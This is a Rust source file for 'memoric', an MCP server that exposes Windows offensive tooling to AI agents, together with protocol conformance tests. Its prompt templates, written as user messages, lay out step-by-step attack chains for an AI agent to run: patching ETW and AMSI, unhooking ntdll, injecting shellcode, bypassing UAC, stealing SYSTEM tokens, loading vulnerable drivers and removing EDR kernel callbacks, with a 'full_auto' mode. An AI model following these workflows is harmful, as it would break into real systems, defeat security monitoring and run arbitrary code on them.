//! MCP Server implementation

use crate::error::Result;
use serde_json::Value;
use tracing::{error, info};

/// Run the MCP server over STDIO
pub fn run_server() -> Result<()> {
    info!("Starting MCP server with STDIO transport");
    run_stdio_server()?;
    Ok(())
}

/// STDIO server loop
fn run_stdio_server() -> Result<()> {
    use std::io::{self, BufRead, Write};

    let stdin = io::stdin();
    let mut stdout = io::stdout();

    info!("MCP server ready, waiting for requests...");

    let mut consecutive_errors: u32 = 0;
    const MAX_CONSECUTIVE_ERRORS: u32 = 50;

    for line in stdin.lock().lines() {
        let line = match line {
            Ok(l) => l,
            Err(e) => {
                error!("Failed to read line: {}", e);
                consecutive_errors += 1;
                if consecutive_errors >= MAX_CONSECUTIVE_ERRORS {
                    error!(
                        "Too many consecutive read errors ({}), shutting down",
                        consecutive_errors
                    );
                    break;
                }
                continue;
            }
        };

        // Skip empty lines and whitespace-only lines
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        // Reset error counter on valid input
        consecutive_errors = 0;

        match handle_request(trimmed) {
            Ok(response) => {
                if !response.is_empty() {
                    if let Err(e) = writeln!(stdout, "{}", response) {
                        error!("Failed to write response: {}", e);
                        // stdout broken — likely pipe closed, shut down gracefully
                        break;
                    }
                    if let Err(e) = stdout.flush() {
                        error!("Failed to flush stdout: {}", e);
                        break;
                    }
                }
            }
            Err(e) => {
                error!("Failed to handle request: {}", e);
                // Try to send a parse error response (JSON-RPC -32700)
                let error_response = format!(
                    r#"{{"jsonrpc":"2.0","error":{{"code":-32700,"message":"{}"}},"id":null}}"#,
                    e.replace('"', "'")
                );
                let _ = writeln!(stdout, "{}", error_response);
                let _ = stdout.flush();
            }
        }
    }

    Ok(())
}

/// Handle a JSON-RPC request
fn handle_request(request: &str) -> std::result::Result<String, String> {
    use serde_json::Value;

    // Parse the request
    let value: Value = match serde_json::from_str(request) {
        Ok(value) => value,
        Err(e) => {
            return Ok(crate::mcp::protocol::json_rpc_error_string(
                -32700,
                &format!("Parse error: {}", e),
                None,
            ));
        }
    };

    let parts = match crate::mcp::protocol::validate_json_rpc_request(&value) {
        Ok(parts) => parts,
        Err(error) => return Ok(error.to_string()),
    };
    if !parts.expects_response {
        return Ok(String::new());
    }
    let method = parts.method;
    let id = parts.id.clone().unwrap_or(Value::Null);

    // Handle the method
    let result = match method {
        "initialize" => handle_initialize(&value),
        "tools/list" => crate::mcp::tools::list_request(&value),
        "tools/call" => handle_tools_call(&value),
        "resources/list" => crate::mcp::resources::list_request(&value),
        "resources/templates/list" => crate::mcp::resources::templates_list_request(&value),
        "resources/read" => crate::mcp::resources::read_request(&value),
        "tasks/list" => crate::mcp::tasks::list_request(&value),
        "tasks/get" => crate::mcp::tasks::get_request(&value),
        "tasks/result" => crate::mcp::tasks::result_request(&value),
        "tasks/cancel" => crate::mcp::tasks::cancel_request(&value),
        "tasks/input_response" => crate::mcp::tasks::input_response_request(&value),
        "tasks/update" => crate::mcp::tasks::update_request(&value),
        "prompts/list" => handle_prompts_list(),
        "prompts/get" => handle_prompts_get(&value),
        "ping" => Ok(Value::Null),
        _ if crate::mcp::protocol::is_app_bridge_host_only_method(method) => {
            return Ok(crate::mcp::protocol::app_bridge_unsupported_error_string(
                method,
                Some(id),
            ));
        }
        _ => {
            // JSON-RPC -32601: Method not found
            return Ok(crate::mcp::protocol::json_rpc_error_string(
                -32601,
                &format!("Method not found: {}", method),
                Some(id),
            ));
        }
    };

    match result {
        Ok(result_value) => Ok(serde_json::json!({
            "jsonrpc": "2.0",
            "result": result_value,
            "id": id
        })
        .to_string()),
        Err(e) => Ok(crate::mcp::protocol::json_rpc_error_string(
            json_rpc_code_for_handler_error(&e),
            &e,
            Some(id),
        )),
    }
}

fn json_rpc_code_for_handler_error(message: &str) -> i64 {
    if message.starts_with("Missing ")
        || message.starts_with("Invalid ")
        || message.contains("not found")
    {
        -32602
    } else {
        -32603
    }
}

fn handle_initialize(_request: &Value) -> std::result::Result<Value, String> {
    info!("MCP client initializing");
    // Return the full result object (will be wrapped by handle_request)
    Ok(crate::mcp::protocol::initialize_result("memoric"))
}

fn handle_tools_call(request: &Value) -> std::result::Result<Value, String> {
    crate::mcp::request_context::with_request_context_from_request(
        request,
        crate::mcp::request_context::McpTransportKind::Legacy,
        || {
            use crate::mcp::tool_call::call_tool;
            crate::observability::record_mcp_request(
                crate::mcp::request_context::McpTransportKind::Legacy,
                request,
            );

            let params = request.get("params").ok_or("Missing params")?;

            let name = params
                .get("name")
                .and_then(|v| v.as_str())
                .ok_or("Missing tool name")?;

            let args = params
                .get("arguments")
                .cloned()
                .unwrap_or(Value::Object(serde_json::Map::new()));

            let task_augmented = crate::mcp::tasks::is_task_augmented_request(request);
            let as_task = args
                .get("as_task")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if task_augmented || as_task {
                let options = if task_augmented {
                    crate::mcp::tasks::task_options_from_request(request)
                } else {
                    crate::mcp::tasks::TaskOptions::default()
                };
                return match crate::mcp::tasks::spawn_tool_task_with_options(name, &args, options) {
                    Ok(task_id) if task_augmented => {
                        Ok(crate::mcp::tasks::task_create_result(&task_id))
                    }
                    Ok(task_id) => Ok(crate::mcp::tasks::task_accepted_content(
                        name, &args, &task_id,
                    )),
                    Err(err) => Ok(crate::mcp::protocol::tool_error_content(name, &args, &err)),
                };
            }

            // Catch panics in tool handlers to prevent server crash
            let name_owned = name.to_string();
            let args_for_call = args.clone();
            match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                call_tool(&name_owned, args_for_call)
            })) {
                Ok(Ok(value)) => Ok(crate::mcp::protocol::tool_success_content(
                    &name_owned,
                    &args,
                    &value,
                )),
                Ok(Err(err)) => Ok(crate::mcp::protocol::tool_error_content(
                    &name_owned,
                    &args,
                    &err,
                )),
                Err(panic_info) => {
                    let panic_msg = if let Some(s) = panic_info.downcast_ref::<String>() {
                        s.clone()
                    } else if let Some(s) = panic_info.downcast_ref::<&str>() {
                        s.to_string()
                    } else {
                        "Unknown panic in tool handler".to_string()
                    };
                    error!("PANIC in tool '{}': {}", name_owned, panic_msg);
                    Ok(crate::mcp::protocol::tool_error_content(
                        &name_owned,
                        &args,
                        &format!("Internal error in tool '{}': {}", name_owned, panic_msg),
                    ))
                }
            }
        },
    )
}

// ═════════════════════════════════════════════════════════════════════════════
// Resources - MCP resource providers
// ═════════════════════════════════════════════════════════════════════════════

fn handle_resources_list() -> std::result::Result<Value, String> {
    Ok(serde_json::json!({
        "resources": [
            {
                "uri": "memoric://status",
                "name": "Server Status",
                "description": "Current memoric server status, privilege level, and capabilities",
                "mimeType": "application/json"
            },
            {
                "uri": "memoric://processes",
                "name": "Process List",
                "description": "Running processes on the target system",
                "mimeType": "application/json"
            },
            {
                "uri": "memoric://scan-sessions",
                "name": "Scan Sessions",
                "description": "Active memory scan sessions (Cheat Engine-style)",
                "mimeType": "application/json"
            },
            {
                "uri": "memoric://drivers",
                "name": "Loaded Drivers",
                "description": "Available BYOVD drivers and their status",
                "mimeType": "application/json"
            }
        ]
    }))
}

fn handle_resources_read(request: &Value) -> std::result::Result<Value, String> {
    let params = request.get("params").ok_or("Missing params")?;
    let uri = params
        .get("uri")
        .and_then(|v| v.as_str())
        .ok_or("Missing resource URI")?;

    let content = match uri {
        "memoric://status" => {
            let admin = crate::privilege::uac::is_admin().unwrap_or(serde_json::json!(false));
            serde_json::json!({
                "server": "memoric",
                "version": "0.3.0",
                "is_admin": admin,
                "pid": std::process::id(),
                "tools_count": crate::mcp::tools::register_tools().len(),
                "capabilities": ["memory_rw", "injection", "evasion", "kernel_byovd", "orchestration"]
            })
        }
        "memoric://processes" => {
            crate::info::process::list_processes(&serde_json::json!({"limit": 200}))
                .unwrap_or_else(|e| serde_json::json!({"error": e.to_string()}))
        }
        "memoric://scan-sessions" => crate::memory::session::scan_list(&serde_json::json!({}))
            .unwrap_or_else(|e| serde_json::json!({"error": e.to_string()})),
        "memoric://drivers" => crate::kernel::discover_vulnerable_drivers(&serde_json::json!({}))
            .unwrap_or_else(|e| serde_json::json!({"error": e.to_string()})),
        _ => return Err(format!("Unknown resource URI: {}", uri)),
    };

    Ok(serde_json::json!({
        "contents": [{
            "uri": uri,
            "mimeType": "application/json",
            "text": serde_json::to_string_pretty(&content).unwrap_or_default()
        }]
    }))
}

// ═════════════════════════════════════════════════════════════════════════════
// Prompts - Pre-built workflow templates
// ═════════════════════════════════════════════════════════════════════════════

fn handle_prompts_list() -> std::result::Result<Value, String> {
    Ok(serde_json::json!({
        "prompts": [
            {
                "name": "stealth_inject",
                "description": "Guided stealth injection workflow: assess EDR → patch telemetry → unhook → inject → sleep encrypt",
                "arguments": [
                    {"name": "target_process", "description": "Target process name", "required": true},
                    {"name": "shellcode_hex", "description": "Hex-encoded shellcode", "required": true}
                ]
            },
            {
                "name": "privilege_escalation",
                "description": "Guided privilege escalation: check current level → try debug privilege → token manipulation → potato attack",
                "arguments": [
                    {"name": "target_privilege", "description": "Desired privilege level (admin/system)", "required": false}
                ]
            },
            {
                "name": "memory_forensics",
                "description": "Memory forensics workflow: enumerate processes → scan memory regions → search patterns → extract artifacts",
                "arguments": [
                    {"name": "target_pid", "description": "Process ID to analyze", "required": true},
                    {"name": "search_pattern", "description": "Hex pattern to search for", "required": false}
                ]
            },
            {
                "name": "kernel_attack",
                "description": "Kernel attack chain: load BYOVD driver → enumerate callbacks → disable EDR kernel hooks → elevate token",
                "arguments": [
                    {"name": "driver_name", "description": "Preferred BYOVD driver (e.g. dbutil, iqvw64e)", "required": false}
                ]
            },
            {
                "name": "full_auto",
                "description": "Fully automated orchestration: assess → plan → evade → inject → cleanup. Uses the orchestration engine.",
                "arguments": [
                    {"name": "target_pid", "description": "Target process ID", "required": true},
                    {"name": "shellcode_hex", "description": "Hex-encoded shellcode", "required": true},
                    {"name": "dry_run", "description": "If true, plan but don't execute", "required": false}
                ]
            }
        ]
    }))
}

fn handle_prompts_get(request: &Value) -> std::result::Result<Value, String> {
    let params = request.get("params").ok_or("Missing params")?;
    let name = params
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing prompt name")?;
    let prompt_args = params
        .get("arguments")
        .cloned()
        .unwrap_or(serde_json::json!({}));

    match name {
        "stealth_inject" => {
            let target = prompt_args
                .get("target_process")
                .and_then(|v| v.as_str())
                .unwrap_or("explorer.exe");
            let shellcode = prompt_args
                .get("shellcode_hex")
                .and_then(|v| v.as_str())
                .unwrap_or("<shellcode>");
            Ok(serde_json::json!({
                "description": "Stealth injection workflow",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Execute a stealth injection into {}. Follow this exact sequence:\n\
                                1. Check privileges with privilege(action='check')\n\
                                2. Enable debug privilege with privilege(action='debug_priv')\n\
                                3. Quick EDR check with detect(action='edr_quick_check')\n\
                                4. Patch ETW with stealth(action='patch_etw')\n\
                                5. Patch AMSI with stealth(action='patch_amsi')\n\
                                6. Unhook ntdll with stealth(action='unhook_ntdll')\n\
                                7. Find target with target(action='ps_find', name='{}')\n\
                                8. Inject with inject(action='shellcode', pid=<PID>, method='mockingjay', shellcode='{}')\n\
                                9. Start sleep encryption with stealth(action='sleep_ekko', duration_ms=5000)",
                                target, target, shellcode
                            )
                        }
                    }
                ]
            }))
        }
        "privilege_escalation" => {
            let level = prompt_args
                .get("target_privilege")
                .and_then(|v| v.as_str())
                .unwrap_or("system");
            Ok(serde_json::json!({
                "description": "Privilege escalation workflow",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Escalate privileges to {} level. Follow this sequence:\n\
                                1. Check current status with privilege(action='check')\n\
                                2. Check UAC level with privilege(action='uac_status')\n\
                                3. Try debug privilege with privilege(action='debug_priv')\n\
                                4. If not admin, try privilege(action='uac_bypass')\n\
                                5. For SYSTEM, try privilege(action='token_steal', source_pid=<winlogon_pid>)\n\
                                6. If kernel driver available, try kernel(action='token_escalate', pid=<our_pid>)",
                                level
                            )
                        }
                    }
                ]
            }))
        }
        "memory_forensics" => {
            let pid = prompt_args
                .get("target_pid")
                .and_then(|v| v.as_str())
                .unwrap_or("<PID>");
            let pattern = prompt_args
                .get("search_pattern")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let scan_step = if pattern.is_empty() {
                "5. Skip pattern scan (no pattern specified)".to_string()
            } else {
                format!(
                    "5. Scan for pattern with memory(action='scan', pid={}, pattern='{}')",
                    pid, pattern
                )
            };
            Ok(serde_json::json!({
                "description": "Memory forensics workflow",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Perform memory forensics on PID {}. Follow this sequence:\n\
                                1. Get process info with target(action='ps_info', pid={})\n\
                                2. List modules with target(action='modules', pid={})\n\
                                3. Query memory regions with memory(action='query', pid={})\n\
                                4. Read PEB with self(action='peb', pid={})\n\
                                {}\n\
                                6. Report findings",
                                pid, pid, pid, pid, pid, scan_step
                            )
                        }
                    }
                ]
            }))
        }
        "kernel_attack" => {
            let driver = prompt_args
                .get("driver_name")
                .and_then(|v| v.as_str())
                .unwrap_or("auto");
            Ok(serde_json::json!({
                "description": "Kernel attack chain",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Execute kernel attack chain using {} driver. Follow this sequence:\n\
                                1. Check admin with privilege(action='check')\n\
                                2. Discover drivers with kernel(action='driver_discover')\n\
                                3. Load driver with kernel(action='driver_load', driver='{}')\n\
                                4. Enumerate kernel callbacks with kernel(action='enum_callbacks')\n\
                                5. Enumerate object callbacks with kernel(action='object_callback_enum')\n\
                                6. Remove EDR callbacks with kernel(action='remove_callback', index=<N>)\n\
                                7. Disable ETW-TI with kernel(action='etw_ti_remove')\n\
                                8. Enumerate minifilters with kernel(action='minifilter_enum')\n\
                                9. Escalate token with kernel(action='token_escalate', pid=<our_pid>)",
                                driver, driver
                            )
                        }
                    }
                ]
            }))
        }
        "full_auto" => {
            let pid = prompt_args
                .get("target_pid")
                .and_then(|v| v.as_str())
                .unwrap_or("<PID>");
            let shellcode = prompt_args
                .get("shellcode_hex")
                .and_then(|v| v.as_str())
                .unwrap_or("<shellcode>");
            let dry_run = prompt_args
                .get("dry_run")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            Ok(serde_json::json!({
                "description": "Full auto orchestration",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Run fully automated attack orchestration.\n\
                                Use orchestrate(action='execute', pid={}, shellcode='{}', dry_run={}).\n\
                                This will:\n\
                                1. Assess the environment for EDR/AV/kernel protections\n\
                                2. Generate an adaptive evasion plan\n\
                                3. Execute each evasion step in sequence\n\
                                4. Inject shellcode into the target process\n\
                                5. Report results and any failures",
                                pid, shellcode, dry_run
                            )
                        }
                    }
                ]
            }))
        }
        _ => Err(format!("Unknown prompt: {}", name)),
    }
}

#[cfg(test)]
mod tests {
    use super::handle_request;
    use crate::mcp::protocol::PROTOCOL_VERSION;
    use serde_json::{json, Value};

    fn response(input: Value) -> Value {
        let text = handle_request(&input.to_string()).expect("handler response");
        serde_json::from_str(&text).expect("json response")
    }

    #[test]
    fn legacy_handler_conformance_fixtures_cover_core_methods() {
        crate::mcp::conformance::run_conformance("legacy", |case| {
            handle_request(&case.request)
                .unwrap_or_else(|err| panic!("{} handler error: {}", case.name, err))
        });
    }

    #[test]
    fn legacy_handler_adversarial_fixtures_are_stable() {
        crate::mcp::conformance::run_adversarial_conformance("legacy", |case| {
            handle_request(&case.request)
                .unwrap_or_else(|err| panic!("{} handler error: {}", case.name, err))
        });
    }

    #[test]
    fn bad_json_returns_parse_error() {
        let text = handle_request("{not-json").expect("parse error response");
        let value: Value = serde_json::from_str(&text).expect("json response");

        assert_eq!(value["error"]["code"], -32700);
        assert_eq!(value["id"], Value::Null);
    }

    #[test]
    fn invalid_jsonrpc_version_returns_invalid_request() {
        let value = response(json!({
            "jsonrpc": "1.0",
            "id": 7,
            "method": "ping"
        }));

        assert_eq!(value["error"]["code"], -32600);
        assert_eq!(value["id"], 7);
    }

    #[test]
    fn notification_returns_no_response() {
        let text = handle_request(
            &json!({
                "jsonrpc": "2.0",
                "method": "notifications/initialized"
            })
            .to_string(),
        )
        .expect("notification");

        assert!(text.is_empty());
    }

    #[test]
    fn unknown_method_returns_method_not_found() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": "req-unknown",
            "method": "not/a_method"
        }));

        assert_eq!(value["error"]["code"], -32601);
        assert_eq!(value["id"], "req-unknown");
    }

    #[test]
    fn initialize_advertises_current_capabilities() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {}
        }));

        assert_eq!(value["result"]["protocolVersion"], PROTOCOL_VERSION);
        assert_eq!(
            value["result"]["capabilities"]["tools"]["listChanged"],
            false
        );
        assert!(value["result"]["capabilities"]["tasks"]["list"].is_object());
        assert!(value["result"]["capabilities"]["tasks"]["cancel"].is_object());
        assert!(value["result"]["capabilities"]["tasks"]["inputResponse"].is_object());
        assert!(value["result"]["capabilities"]["tasks"]["update"].is_object());
        assert!(value["result"]["capabilities"]["tasks"]["requests"]["tools"]["call"].is_object());
    }

    #[test]
    fn tools_list_includes_task_support_metadata() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/list"
        }));

        let tools = value["result"]["tools"].as_array().expect("tools array");
        assert!(!tools.is_empty());
        assert!(tools
            .iter()
            .all(|tool| tool["execution"]["taskSupport"] == "optional"));
    }

    #[test]
    fn tools_list_uses_cursor_pagination() {
        let first = response(json!({
            "jsonrpc": "2.0",
            "id": "tools-page-1",
            "method": "tools/list",
            "params": { "limit": 2 }
        }));

        let first_tools = first["result"]["tools"].as_array().expect("tools page");
        assert_eq!(first_tools.len(), 2);
        assert_eq!(first_tools[0]["name"], "memoric");
        let cursor = first["result"]["nextCursor"].as_str().expect("next cursor");

        let second = response(json!({
            "jsonrpc": "2.0",
            "id": "tools-page-2",
            "method": "tools/list",
            "params": { "limit": 2, "cursor": cursor }
        }));
        let second_tools = second["result"]["tools"].as_array().expect("tools page");
        assert_eq!(second_tools.len(), 2);
        assert_eq!(second_tools[0]["name"], "memory");
    }

    #[test]
    fn tools_list_invalid_cursor_is_invalid_params() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": "tools-bad-cursor",
            "method": "tools/list",
            "params": {
                "cursor": "bad-cursor"
            }
        }));

        assert_eq!(value["error"]["code"], -32602);
        assert!(value["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .contains("Invalid cursor"));
    }

    #[test]
    fn resources_list_uses_cursor_pagination() {
        let first = response(json!({
            "jsonrpc": "2.0",
            "id": "resources-page-1",
            "method": "resources/list",
            "params": { "limit": 3 }
        }));

        let first_resources = first["result"]["resources"]
            .as_array()
            .expect("resources page");
        assert_eq!(first_resources.len(), 3);
        assert_eq!(first_resources[0]["uri"], "memoric://status");
        let cursor = first["result"]["nextCursor"].as_str().expect("next cursor");

        let second = response(json!({
            "jsonrpc": "2.0",
            "id": "resources-page-2",
            "method": "resources/list",
            "params": { "limit": 3, "cursor": cursor }
        }));
        let second_resources = second["result"]["resources"]
            .as_array()
            .expect("resources page");
        assert_eq!(second_resources.len(), 3);
        assert_eq!(second_resources[0]["uri"], "memoric://tasks");
    }

    #[test]
    fn resources_list_invalid_cursor_is_invalid_params() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": "resources-bad-cursor",
            "method": "resources/list",
            "params": {
                "cursor": "bad-cursor"
            }
        }));

        assert_eq!(value["error"]["code"], -32602);
        assert!(value["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .contains("Invalid cursor"));
    }

    #[test]
    fn resources_templates_list_uses_cursor_pagination() {
        let first = response(json!({
            "jsonrpc": "2.0",
            "id": "resource-templates-page-1",
            "method": "resources/templates/list",
            "params": { "limit": 2 }
        }));

        let first_templates = first["result"]["resourceTemplates"]
            .as_array()
            .expect("resource templates page");
        assert_eq!(first_templates.len(), 2);
        let cursor = first["result"]["nextCursor"].as_str().expect("next cursor");

        let second = response(json!({
            "jsonrpc": "2.0",
            "id": "resource-templates-page-2",
            "method": "resources/templates/list",
            "params": { "limit": 2, "cursor": cursor }
        }));
        let second_templates = second["result"]["resourceTemplates"]
            .as_array()
            .expect("resource templates page");
        assert!(!second_templates.is_empty());
    }

    #[test]
    fn resources_templates_list_invalid_cursor_is_invalid_params() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": "resource-templates-bad-cursor",
            "method": "resources/templates/list",
            "params": {
                "cursor": "bad-cursor"
            }
        }));

        assert_eq!(value["error"]["code"], -32602);
        assert!(value["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .contains("Invalid cursor"));
    }

    #[test]
    fn tools_call_missing_params_is_invalid_params() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call"
        }));

        assert_eq!(value["error"]["code"], -32602);
        assert!(value["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .contains("Missing params"));
    }

    #[test]
    fn tasks_result_missing_task_id_is_invalid_params() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": 4,
            "method": "tasks/result",
            "params": {}
        }));

        assert_eq!(value["error"]["code"], -32602);
        assert!(value["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .contains("Missing task_id"));
    }

    #[test]
    fn tasks_list_invalid_cursor_is_invalid_params() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": 6,
            "method": "tasks/list",
            "params": {
                "cursor": "bad-cursor"
            }
        }));

        assert_eq!(value["error"]["code"], -32602);
        assert!(value["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .contains("Invalid cursor"));
    }

    #[test]
    fn ping_returns_null_result() {
        let value = response(json!({
            "jsonrpc": "2.0",
            "id": 5,
            "method": "ping"
        }));

        assert_eq!(value["result"], Value::Null);
    }

    #[test]
    fn legacy_handler_records_app_origin_in_timeline_events() {
        let request = json!({
            "jsonrpc": "2.0",
            "id": "ui-origin-legacy",
            "method": "tools/call",
            "params": {
                "name": "self",
                "arguments": {
                    "action": "version",
                    "request_id": "ui-origin-legacy"
                },
                "_meta": {
                    "io.memoric/app-origin": "ui://memoric/dashboard"
                }
            }
        });

        let _ = handle_request(&request.to_string()).expect("legacy handler response");
        let timeline = crate::observability::timeline_json(&json!({
            "correlation_id": "ui-origin-legacy",
            "limit": 20,
            "redaction": "strict"
        }));

        let events = timeline["events"].as_array().expect("timeline events");
        assert!(events.iter().any(|event| {
            event["kind"] == "mcp.request"
                && event["correlation_id"] == "ui-origin-legacy"
                && event["details"]["app_origin"] == "ui://memoric/dashboard"
                && event["details"]["policy_origin"] == "app"
        }));
    }
}
